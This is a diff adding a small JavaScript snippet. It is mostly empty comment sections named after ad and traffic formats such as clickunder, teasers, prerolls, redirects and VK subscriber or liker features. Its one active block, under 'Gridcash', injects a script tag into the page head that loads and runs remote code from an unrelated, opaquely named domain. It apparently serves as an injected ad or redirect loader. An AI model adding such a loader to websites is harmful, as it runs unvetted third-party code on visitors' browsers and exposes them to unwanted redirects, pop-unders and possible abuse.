@@ -1,0 +1,38 @@
+(function() {
+
+// Search message: 
+
+
+// Teasers message: 
+
+
+// Clickunder message: 
+
+
+// Banners message: 
+
+
+// Prerolls message: 
+
+
+// Gridcash message: 
+
+var script = document.createElement('script');
+script.src = 'https://biberukalap.com/2701611435a0d693.1.n.2.2.js';
+script.async = '';
+document.getElementsByTagName('head')[0].appendChild(script);
+
+
+// Refredirect message: 
+
+
+// RefredirectByTitle
+
+
+// SubscriberVK message: 
+
+
+// LikerVK message: 
+
+
+})();
